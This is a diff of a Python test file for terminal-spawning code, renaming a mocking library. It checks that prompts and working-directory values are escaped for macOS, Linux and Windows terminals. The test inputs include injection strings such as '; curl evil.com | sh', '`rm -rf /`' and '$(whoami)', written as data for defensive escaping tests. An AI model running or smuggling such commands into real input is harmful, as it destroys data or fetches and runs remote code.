@@ -14,7 +14,7 @@ import sys
 import tempfile
 import types
 
-import bigfoot
+import tripwire
 import pytest
 from pathlib import Path
 
@@ -98,10 +98,10 @@ class TestAppleScriptEscaping:
         prompt = "$(echo pwned)"
         expected_applescript = _expected_macos_applescript("terminal", prompt, "/tmp", "claude")
 
-        mock_popen = bigfoot.mock("spellbook.daemon.terminal:subprocess.Popen")
+        mock_popen = tripwire.mock("spellbook.daemon.terminal:subprocess.Popen")
         mock_popen.returns(types.SimpleNamespace(pid=1234))
 
-        with bigfoot:
+        with tripwire:
             result = spawn_macos_terminal(
                 terminal="terminal",
                 prompt=prompt,
@@ -122,10 +122,10 @@ class TestAppleScriptEscaping:
         prompt = '"; rm -rf / #'
         expected_applescript = _expected_macos_applescript("terminal", prompt, "/tmp", "claude")
 
-        mock_popen = bigfoot.mock("spellbook.daemon.terminal:subprocess.Popen")
+        mock_popen = tripwire.mock("spellbook.daemon.terminal:subprocess.Popen")
         mock_popen.returns(types.SimpleNamespace(pid=1234))
 
-        with bigfoot:
+        with tripwire:
             result = spawn_macos_terminal(
                 terminal="terminal",
                 prompt=prompt,
@@ -146,10 +146,10 @@ class TestAppleScriptEscaping:
         prompt = "`rm -rf /`"
         expected_applescript = _expected_macos_applescript("terminal", prompt, "/tmp", "claude")
 
-        mock_popen = bigfoot.mock("spellbook.daemon.terminal:subprocess.Popen")
+        mock_popen = tripwire.mock("spellbook.daemon.terminal:subprocess.Popen")
         mock_popen.returns(types.SimpleNamespace(pid=1234))
 
-        with bigfoot:
+        with tripwire:
             result = spawn_macos_terminal(
                 terminal="terminal",
                 prompt=prompt,
@@ -170,10 +170,10 @@ class TestAppleScriptEscaping:
         malicious_wd = '/tmp/$(whoami)'
         expected_applescript = _expected_macos_applescript("terminal", "hello", malicious_wd, "claude")
 
-        mock_popen = bigfoot.mock("spellbook.daemon.terminal:subprocess.Popen")
+        mock_popen = tripwire.mock("spellbook.daemon.terminal:subprocess.Popen")
         mock_popen.returns(types.SimpleNamespace(pid=1234))
 
-        with bigfoot:
+        with tripwire:
             result = spawn_macos_terminal(
                 terminal="terminal",
                 prompt="hello",
@@ -194,10 +194,10 @@ class TestAppleScriptEscaping:
         prompt = "$(whoami)"
         expected_applescript = _expected_macos_applescript("iterm2", prompt, "/tmp", "claude")
 
-        mock_popen = bigfoot.mock("spellbook.daemon.terminal:subprocess.Popen")
+        mock_popen = tripwire.mock("spellbook.daemon.terminal:subprocess.Popen")
         mock_popen.returns(types.SimpleNamespace(pid=5678))
 
-        with bigfoot:
+        with tripwire:
             result = spawn_macos_terminal(
                 terminal="iTerm2",
                 prompt=prompt,
@@ -218,10 +218,10 @@ class TestAppleScriptEscaping:
         prompt = "; curl evil.com | sh"
         expected_applescript = _expected_macos_applescript("warp", prompt, "/tmp", "claude")
 
-        mock_popen = bigfoot.mock("spellbook.daemon.terminal:subprocess.Popen")
+        mock_popen = tripwire.mock("spellbook.daemon.terminal:subprocess.Popen")
         mock_popen.returns(types.SimpleNamespace(pid=9999))
 
-        with bigfoot:
+        with tripwire:
             result = spawn_macos_terminal(
                 terminal="Warp",
                 prompt=prompt,
@@ -241,10 +241,10 @@ class TestAppleScriptEscaping:
 
         expected_applescript = _expected_macos_applescript("terminal", "safe prompt", "/tmp", "claude")
 
-        mock_popen = bigfoot.mock("spellbook.daemon.terminal:subprocess.Popen")
+        mock_popen = tripwire.mock("spellbook.daemon.terminal:subprocess.Popen")
         mock_popen.returns(types.SimpleNamespace(pid=1234))
 
-        with bigfoot:
+        with tripwire:
             spawn_macos_terminal(
                 terminal="terminal",
                 prompt="safe prompt",
@@ -268,10 +268,10 @@ class TestLinuxTerminalEscaping:
         prompt = "$(echo pwned)"
         expected_cmd = _expected_linux_command("gnome-terminal", prompt, "/tmp", "claude")
 
-        mock_popen = bigfoot.mock("spellbook.daemon.terminal:subprocess.Popen")
+        mock_popen = tripwire.mock("spellbook.daemon.terminal:subprocess.Popen")
         mock_popen.returns(types.SimpleNamespace(pid=1234))
 
-        with bigfoot:
+        with tripwire:
             result = spawn_linux_terminal(
                 terminal="gnome-terminal",
                 prompt=prompt,
@@ -292,10 +292,10 @@ class TestLinuxTerminalEscaping:
         malicious_wd = "/tmp/$(id)"
         expected_cmd = _expected_linux_command("xterm", "hello", malicious_wd, "claude")
 
-        mock_popen = bigfoot.mock("spellbook.daemon.terminal:subprocess.Popen")
+        mock_popen = tripwire.mock("spellbook.daemon.terminal:subprocess.Popen")
         mock_popen.returns(types.SimpleNamespace(pid=1234))
 
-        with bigfoot:
+        with tripwire:
             result = spawn_linux_terminal(
                 terminal="xterm",
                 prompt="hello",
@@ -316,10 +316,10 @@ class TestLinuxTerminalEscaping:
         prompt = "; rm -rf / ;"
         expected_cmd = _expected_linux_command("konsole", prompt, "/tmp", "claude")
 
-        mock_popen = bigfoot.mock("spellbook.daemon.terminal:subprocess.Popen")
+        mock_popen = tripwire.mock("spellbook.daemon.terminal:subprocess.Popen")
         mock_popen.returns(types.SimpleNamespace(pid=1234))
 
-        with bigfoot:
+        with tripwire:
             result = spawn_linux_terminal(
                 terminal="konsole",
                 prompt=prompt,
@@ -340,10 +340,10 @@ class TestLinuxTerminalEscaping:
         prompt = "$(evil)"
         expected_cmd = _expected_linux_command("terminator", prompt, "/tmp", "claude")
 
-        mock_popen = bigfoot.mock("spellbook.daemon.terminal:subprocess.Popen")
+        mock_popen = tripwire.mock("spellbook.daemon.terminal:subprocess.Popen")
         mock_popen.returns(types.SimpleNamespace(pid=1234))
 
-        with bigfoot:
+        with tripwire:
             result = spawn_linux_terminal(
                 terminal="terminator",
                 prompt=prompt,
@@ -369,10 +369,10 @@ class TestWindowsTerminalEscaping:
         safe_cli_prompt = subprocess.list2cmdline(["claude", prompt])
         expected_cmd = ["wt", "-d", "C:\\Users\\test", "cmd", "/c", safe_cli_prompt]
 
-        mock_popen = bigfoot.mock("spellbook.daemon.terminal:subprocess.Popen")
+        mock_popen = tripwire.mock("spellbook.daemon.terminal:subprocess.Popen")
         mock_popen.returns(types.SimpleNamespace(pid=1234))
 
-        with bigfoot:
+        with tripwire:
             result = spawn_windows_terminal(
                 terminal="windows-terminal",
                 prompt=prompt,
@@ -394,10 +394,10 @@ class TestWindowsTerminalEscaping:
         expected_cmd = ["pwsh", "-NoExit", "-Command",
                        "Set-Location 'C:\\Users\\test'; & 'claude' 'test & del *'"]
 
-        mock_popen = bigfoot.mock("spellbook.daemon.terminal:subprocess.Popen")
+        mock_popen = tripwire.mock("spellbook.daemon.terminal:subprocess.Popen")
         mock_popen.returns(types.SimpleNamespace(pid=1234))
 
-        with bigfoot:
+        with tripwire:
             result = spawn_windows_terminal(
                 terminal="pwsh",
                 prompt=prompt,
@@ -420,10 +420,10 @@ class TestWindowsTerminalEscaping:
         expected_cmd = ["cmd", "/c", "start", "cmd", "/k",
                        f'cd /d "C:\\Users\\test" && {safe_cli_prompt}']
 
-        mock_popen = bigfoot.mock("spellbook.daemon.terminal:subprocess.Popen")
+        mock_popen = tripwire.mock("spellbook.daemon.terminal:subprocess.Popen")
         mock_popen.returns(types.SimpleNamespace(pid=1234))
 
-        with bigfoot:
+        with tripwire:
             result = spawn_windows_terminal(
                 terminal="cmd",
                 prompt=prompt,
@@ -556,10 +556,10 @@ class TestCLICommandAllowlist:
         monkeypatch.setenv("SPELLBOOK_CLI_COMMAND", "codex")
         monkeypatch.setattr("sys.platform", "darwin")
 
-        mock_spawn = bigfoot.mock("spellbook.daemon.terminal:spawn_macos_terminal")
+        mock_spawn = tripwire.mock("spellbook.daemon.terminal:spawn_macos_terminal")
         mock_spawn.returns({"status": "spawned", "terminal": "t", "pid": 1})
 
-        with bigfoot:
+        with tripwire:
             spawn_terminal_window("terminal", "hello", "/tmp")
 
         mock_spawn.assert_call(args=("terminal", "hello", "/tmp", "codex"))
@@ -574,21 +574,21 @@ class TestTerminalEnvAllowlist:
 
         monkeypatch.setenv("TERMINAL", "/tmp/evil")
 
-        mock_which = bigfoot.mock("shutil:which")
+        mock_which = tripwire.mock("shutil:which")
         mock_which.returns(None)
 
-        mock_run = bigfoot.mock("spellbook.daemon.terminal:subprocess.run")
+        mock_run = tripwire.mock("spellbook.daemon.terminal:subprocess.run")
         # 5 common terminals in cascade, all not found
         for _ in range(5):
             mock_run.returns(types.SimpleNamespace(returncode=1))
 
-        with bigfoot:
+        with tripwire:
             result = detect_linux_terminal()
 
         # Must NOT return the malicious value; should fall through to detection
         assert result == "xterm"  # final fallback
         mock_which.assert_call(args=("evil",))
-        bigfoot.log.assert_log(
+        tripwire.log.assert_log(
             "WARNING",
             "TERMINAL env var '/tmp/evil' not found via which(), falling back to detection",
             "spellbook.daemon.terminal",
@@ -605,10 +605,10 @@ class TestTerminalEnvAllowlist:
 
         monkeypatch.setenv("TERMINAL", "alacritty")
 
-        mock_which = bigfoot.mock("shutil:which")
+        mock_which = tripwire.mock("shutil:which")
         mock_which.returns("/usr/bin/alacritty")
 
-        with bigfoot:
+        with tripwire:
             result = detect_linux_terminal()
 
         assert result == "alacritty"
@@ -620,10 +620,10 @@ class TestTerminalEnvAllowlist:
 
         monkeypatch.setenv("TERMINAL", "/usr/bin/gnome-terminal")
 
-        mock_which = bigfoot.mock("shutil:which")
+        mock_which = tripwire.mock("shutil:which")
         mock_which.returns("/usr/bin/gnome-terminal")
 
-        with bigfoot:
+        with tripwire:
             result = detect_linux_terminal()
 
         assert result == "gnome-terminal"
@@ -635,19 +635,19 @@ class TestTerminalEnvAllowlist:
 
         monkeypatch.setenv("TERMINAL", "kitty")
 
-        mock_which = bigfoot.mock("shutil:which")
+        mock_which = tripwire.mock("shutil:which")
         mock_which.returns(None)
 
         # gnome-terminal is first in cascade, found immediately
-        mock_run = bigfoot.mock("spellbook.daemon.terminal:subprocess.run")
+        mock_run = tripwire.mock("spellbook.daemon.terminal:subprocess.run")
         mock_run.returns(types.SimpleNamespace(returncode=0))
 
-        with bigfoot:
+        with tripwire:
             result = detect_linux_terminal()
 
         assert result == "gnome-terminal"
         mock_which.assert_call(args=("kitty",))
-        bigfoot.log.assert_log(
+        tripwire.log.assert_log(
             "WARNING",
             "TERMINAL env var 'kitty' not found via which(), falling back to detection",
             "spellbook.daemon.terminal",
@@ -664,11 +664,11 @@ class TestTerminalEnvAllowlist:
         monkeypatch.setenv("TERMINAL", "")
 
         # gnome-terminal not found, konsole found
-        mock_run = bigfoot.mock("spellbook.daemon.terminal:subprocess.run")
+        mock_run = tripwire.mock("spellbook.daemon.terminal:subprocess.run")
         mock_run.returns(types.SimpleNamespace(returncode=1))
         mock_run.returns(types.SimpleNamespace(returncode=0))
 
-        with bigfoot:
+        with tripwire:
             result = detect_linux_terminal()
 
         assert result == "konsole"
@@ -688,11 +688,11 @@ class TestTerminalEnvAllowlist:
         monkeypatch.delenv("TERMINAL", raising=False)
 
         # gnome-terminal not found, konsole found
-        mock_run = bigfoot.mock("spellbook.daemon.terminal:subprocess.run")
+        mock_run = tripwire.mock("spellbook.daemon.terminal:subprocess.run")
         mock_run.returns(types.SimpleNamespace(returncode=1))
         mock_run.returns(types.SimpleNamespace(returncode=0))
 
-        with bigfoot:
+        with tripwire:
             result = detect_linux_terminal()
 
         assert result == "konsole"
